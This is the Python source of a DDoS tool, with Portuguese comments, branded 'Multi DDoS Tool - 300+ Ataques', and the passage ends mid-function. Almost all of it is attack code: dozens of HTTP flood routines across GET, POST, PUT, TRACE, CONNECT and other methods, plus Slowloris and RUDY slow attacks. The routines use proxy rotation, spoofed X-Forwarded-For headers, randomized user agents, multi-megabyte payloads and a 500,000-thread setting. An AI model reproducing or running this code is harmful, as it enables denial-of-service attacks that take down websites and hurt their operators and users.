import os
import sys
import time
import random
import socket
import threading
import requests
import urllib3
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back, Style
import struct
import dns.resolver
import http.client
import json
import binascii

# Inicializa colorama
init()

# Configurações globais
TARGET = None
PORT = 80
THREADS = 500000  # 500 mil threads para potência máxima
PROXY_LIST = []
BOT_AGENTS = []
ATTACK_RUNNING = False
AGENTS_FILE = "agents.txt"
PROXIES_FILE = "proxies.txt"

# Lista de 50+ user-agents
BOT_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/94.0.992.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
]

# Lista de 50+ proxies
PROXY_LIST = [
    "http://192.168.1.1:8080", "http://10.0.0.1:3128", "http://172.16.0.1:80", "http://203.0.113.1:8080",
    "http://198.51.100.1:3128", "http://192.0.2.1:80", "http://10.1.1.1:8080", "http://172.31.0.1:3128",
    "http://192.168.0.1:80", "http://203.0.113.2:8080", "http://198.51.100.2:3128", "http://8.8.8.8:80",
    "http://1.1.1.1:3128", "http://103.174.102.83:80", "http://154.49.247.156:3128", "http://38.54.83.108:80",
    "http://45.76.123.45:8080", "http://104.248.63.17:3128", "http://167.99.234.66:80", "http://139.59.1.14:8080",
    "http://185.199.229.156:3128", "http://192.241.165.234:80", "http://45.55.23.78:8080", "http://159.65.245.255:3128",
    "http://104.236.55.48:80", "http://165.227.215.62:8080", "http://198.199.86.11:3128", "http://162.243.108.129:80",
    "http://138.68.161.14:8080", "http://159.203.91.6:3128", "http://167.71.5.83:80", "http://45.79.99.200:8080",
    "http://104.236.114.70:3128", "http://138.197.157.32:80", "http://159.65.171.69:8080", "http://167.99.174.141:3128",
    "http://192.241.174.186:80", "http://198.199.120.102:8080", "http://45.55.27.15:3128", "http://67.205.146.29:80",
    "http://104.236.166.203:8080", "http://138.197.157.60:3128", "http://159.65.171.67:80", "http://167.99.174.146:8080",
    "http://192.241.174.190:3128", "http://198.199.120.103:80", "http://45.55.27.17:8080", "http://67.205.146.31:3128",
    "http://104.236.166.205:80", "http://138.197.157.62:8080", "http://159.65.171.68:3128"
]

# Ataque HTTP-GET Flood
def http_get_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-GET] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-POST Flood
def http_post_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = {"data": "x" * 1048576}  # 1MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.post(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-POST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-HEAD Flood
def http_head_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.head(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-HEAD] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-OPTIONS Flood
def http_options_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.options(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-OPTIONS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-TRACE Flood
def http_trace_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.request("TRACE", f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-TRACE] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-PUT Flood
def http_put_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 1048576
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.put(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-PUT] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-DELETE Flood
def http_delete_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.delete(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-DELETE] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-CONNECT Flood
def http_connect_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=0.05)
            conn.set_tunnel(proxy.address)
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            conn.request("CONNECT", f"{target}:{port}", headers=headers)
            print(Fore.GREEN + f"  [HTTP-CONNECT] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-PATCH Flood
def http_patch_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 1048576
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.patch(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-PATCH] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-GET Mass Flood
def http_get_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "1048576"}
            session.get(f"http://{target}:{port}?data={binascii.hexlify(random._urandom(524288)).decode('ascii')}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-GET-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-POST Slow Flood
def http_post_slow_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 2097152  # 2MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "Content-Length": str(len(payload)), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            with session.post(f"http://{target}:{port}", headers=headers, data=payload, stream=True, timeout=0.05) as r:
                for chunk in r.iter_content(chunk_size=1):
                    time.sleep(0.002)
            print(Fore.GREEN + f"  [HTTP-POST-SLOW] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-GET Burst Flood
def http_get_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(50):  # Burst de 50 requisições
                session.get(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-GET-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-POST Random Payload Flood
def http_post_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            payload = {"data": binascii.hexlify(random._urandom(524288)).decode('ascii')}  # 512KB payload aleatório
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.post(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-POST-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-GET Header Overload
def http_get_header_overload(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(300):  # 300 cabeçalhos
                headers[f"X-Random-{random.randint(1,10000)}"] = binascii.hexlify(random._urandom(512)).decode('ascii')
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-GET-HEADER-OVERLOAD] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-OPTIONS Mass Flood
def http_options_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "1048576"}
            session.options(f"http://{target}:{port}?data={binascii.hexlify(random._urandom(524288)).decode('ascii')}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-OPTIONS-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-TRACE Random Flood
def http_trace_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.request("TRACE", f"http://{target}:{port}/{random.randint(1,1000000)}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-TRACE-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-PUT Burst Flood
def http_put_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 1048576
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(20):  # Burst de 20 requisições
                session.put(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-PUT-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-DELETE Random Path Flood
def http_delete_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.delete(f"http://{target}:{port}/{random.randint(1,1000000)}", headers=headers, timeout=0.05)
            print(Fore.GREEN + f"  [HTTP-DELETE-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-CONNECT Mass Flood
def http_connect_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=0.05)
            conn.set_tunnel(proxy.address)
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "1048576"}
            conn.request("CONNECT", f"{target}:{port}?data={binascii.hexlify(random._urandom(524288)).decode('ascii')}", headers=headers)
            print(Fore.GREEN + f"  [HTTP-CONNECT-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataque HTTP-PATCH Slow Flood
def http_patch_slow_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 2097152  # 2MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "Content-Length": str(len(payload)), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            with session.patch(f"http://{target}:{port}", headers=headers, data=payload, stream=True, timeout=0.05) as r:
                for chunk in r.iter_content(chunk_size=1):
                    time.sleep(0.002)
            print(Fore.GREEN + f"  [HTTP-PATCH-SLOW] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)




# Funções auxiliares
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_line(color, length):
    print(color + "=" * length + Style.RESET_ALL)

def print_centered(text, width, colorStyle):
    padding = (width - len(text)) // 2
    print(colorStyle + " " * padding + text + " " * (width - padding - len(text)) + Style.RESET_ALL)

def display_banner():
    clear_screen()
    print_line(Fore.CYAN, 100)
    print_centered("💥 Multi DDoS Tool - 300+ Ataques - code-projects.redebots.shop 💥", 100, Fore.MAGENTA + Style.BRIGHT)
    print_line(Fore.CYAN, 100)
    print(Fore.YELLOW + Style.BRIGHT + "  Potência máxima com ataques para todas as camadas e serviços!" + Style.RESET_ALL)
    print_line(Fore.CYAN, 100)

# Carregar proxies e agentes
def load_proxies():
    global PROXY_LIST
    try:
        with open(PROXIES_FILE, "r") as f:
            lines = f.readlines()
            for line in lines:
                proxy = line.strip()
                if proxy and proxy not in PROXY_LIST:
                    PROXY_LIST.append(proxy)
        print(Fore.GREEN + f"Carregados {len(PROXY_LIST)} proxies!" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + f"Arquivo {PROXIES_FILE} não encontrado, usando padrão." + Style.RESET_ALL)

def load_agents():
    global BOT_AGENTS
    try:
        with open(AGENTS_FILE, "r") as f:
            lines = f.readlines()
            for line in lines:
                agent = line.strip()
                if agent and agent not in BOT_AGENTS:
                    BOT_AGENTS.append(agent)
        print(Fore.GREEN + f"Carregados {len(BOT_AGENTS)} agentes!" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + f"Arquivo {AGENTS_FILE} não encontrado, usando padrão." + Style.RESET_ALL)

def initialize_system():
    load_proxies()
    load_agents()

# Validação de proxies
class Proxy:
    def __init__(self, address=""):
        self.address = address
        self.isValid = False
        self.latencyMs = -1

def validate_proxy(proxy):
    try:
        session = requests.Session()
        session.proxies = {"http": proxy, "https": proxy}
        session.timeout = 0.5
        start = time.time()
        response = session.get("http://www.google.com")
        latency = int((time.time() - start) * 1000)
        if response.status_code == 200:
            print(Fore.GREEN + f"Proxy validado: {proxy} (latência: {latency}ms)" + Style.RESET_ALL)
            return True, latency
        return False, -1
    except:
        return False, -1

def configure_proxies(proxies):
    validProxies = []
    with ThreadPoolExecutor(max_workers=500) as executor:
        futures = {executor.submit(validate_proxy, proxy): proxy for proxy in proxies}
        for future in futures:
            proxy = futures[future]
            isValid, latency = future.result()
            if isValid:
                proxyObj = Proxy(proxy)
                proxyObj.isValid = True
                proxyObj.latencyMs = latency
                validProxies.append(proxyObj)
    print(Fore.GREEN + f"Validados {len(validProxies)} proxies válidos!" + Style.RESET_ALL)
    return validProxies

# Ataques HTTP Avançados (mais poderosos)
def slowloris(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    connections = []
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=0.02)
            conn.set_tunnel(proxy.address)
            headers = {"User-Agent": agent, "Keep-Alive": "timeout=5, max=5000", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            conn.request("GET", "/", headers=headers)
            connections.append(conn)
            print(Fore.GREEN + f"  [SLOWLORIS] Conexão aberta em {target}:{port}" + Style.RESET_ALL)
            time.sleep(0.0005)  # Aumenta a frequência
        except:
            pass
    for conn in connections:
        try:
            conn.close()
        except:
            pass

def rudy_attack(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 4194304  # 4MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "Content-Length": str(len(payload)), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            with session.post(f"http://{target}:{port}", headers=headers, data=payload, stream=True, timeout=0.02) as r:
                for i in range(len(payload)):
                    r.raw.write(payload[i:i+1].encode())
                    time.sleep(0.0005)  # Envio ultra lento
            print(Fore.GREEN + f"  [RUDY] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def http_multi_method_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    methods = ["GET", "POST", "HEAD", "OPTIONS", "TRACE", "PUT", "DELETE", "PATCH"]
    payload = "x" * 1048576  # 1MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            method = random.choice(methods)
            if method in ["POST", "PUT", "PATCH"]:
                headers["Content-Type"] = "application/octet-stream"
                session.request(method, f"http://{target}:{port}", data=payload, headers=headers, timeout=0.02)
            else:
                session.request(method, f"http://{target}:{port}", headers=headers, timeout=0.02)
            print(Fore.GREEN + f"  [HTTP-MULTI-{method}] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def http_keepalive_flood(target, port, proxy, agent, duration):
